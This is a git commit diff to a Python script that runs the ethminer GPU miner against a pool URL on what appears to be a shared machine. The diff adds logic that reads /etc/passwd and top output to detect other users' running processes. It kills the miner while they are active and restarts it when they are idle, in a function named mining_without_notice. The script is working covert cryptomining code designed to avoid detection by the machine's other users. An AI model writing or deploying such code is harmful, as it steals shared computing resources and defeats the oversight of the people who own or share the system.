ee5726849cdd8136ef608c7d4090c23b2f109576
toosyou <toosyou.tw@gmail.com>
2017-10-31 21:13:25 +0800

    use top and status to detect other users

--- inactive_mining.py
+++ inactive_mining.py
@@ -4,33 +4,65 @@ import time
 import threading
 import schedule
 import subprocess
+import sys
+import getpass
 
 mining_is_on = False
 miner_process = None
 
-def mining_without_notice():
+def get_normal_users():
+    rtn = list()
+    command_read = os.popen('''
+    ## get mini UID limit ##
+    l=$(grep "^UID_MIN" /etc/login.defs)
+
+    ## get max UID limit ##
+    l1=$(grep "^UID_MAX" /etc/login.defs)
+
+    ## use awk to print if UID >= $MIN and UID <= $MAX   ##
+    awk -F':' -v "min=${l##UID_MIN}" -v "max=${l1##UID_MAX}" '{ if ( $3 >= min && $3 <= max ) print $0}' /etc/passwd
+
+    ''').read()
+    command_read = command_read.splitlines()
+    for line in command_read:
+        user = line.split(':')[0]
+        rtn.append(user)
+
+    return rtn
+
+def mining_without_notice(mining_url):
     global mining_is_on
     global miner_process
 
-    threading.Timer(5, mining_without_notice).start()
+    threading.Timer(5, mining_without_notice, [mining_url]).start()
+
+    this_user = getpass.getuser()
+    normal_users = get_normal_users()
+
     someone_else_detected = False
-    who_read = os.popen('who').read()
-    who_read = who_read.splitlines()
-    for line in who_read:
-        if not line.startswith('toosyou') and (not 'tmux' in line):
-            print('Someone else logins!\t'+line)
-            someone_else_detected = True
-            if mining_is_on:
-                # kill the miner
-                miner_process.kill()
-                mining_is_on = False
+    top_read = os.popen('top -n 1 -b').read()
+    top_read = top_read.splitlines()[7:]
+    for line in top_read:
+        user_name = line.split()[1]
+        status = line.split()[7]
+        if user_name in normal_users and user_name != this_user:
+            if status == 'R': # the process is running
+                print('Someone else logins and running!', user_name)
+                someone_else_detected = True
+                if mining_is_on:
+                    # kill the miner
+                    miner_process.kill()
+                    mining_is_on = False
 
     # open miner
     if someone_else_detected == False and mining_is_on == False:
         print('Open miner!')
-        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', 'http://ethereumpool.co/?miner=46@0x77209304F249d46DFA6Af187451A32bFeFd219e1@mip1070'], env=os.environ)
+        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', mining_url], env=os.environ)
         print('pid =', miner_process.pid)
         mining_is_on = True
 
 if __name__ == '__main__':
-    mining_without_notice()
+    if len(sys.argv) != 2:
+        print('Argument error!')
+        sys.exit(-1)
+    mining_without_notice(sys.argv[1])
